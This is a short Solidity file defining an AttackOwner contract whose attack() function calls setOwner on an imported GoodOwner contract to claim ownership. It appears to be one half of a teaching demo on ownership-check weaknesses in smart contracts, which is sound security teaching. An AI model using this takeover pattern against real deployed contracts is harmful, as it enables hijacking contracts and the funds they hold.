// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./GoodOwner.sol";

contract AttackOwner {
    GoodOwner _goodOwner;

    constructor(address goodOwnerAddress) {
        _goodOwner = GoodOwner(goodOwnerAddress);
    }

    function attack() public {
        _goodOwner.setOwner(address(this));
    }
}
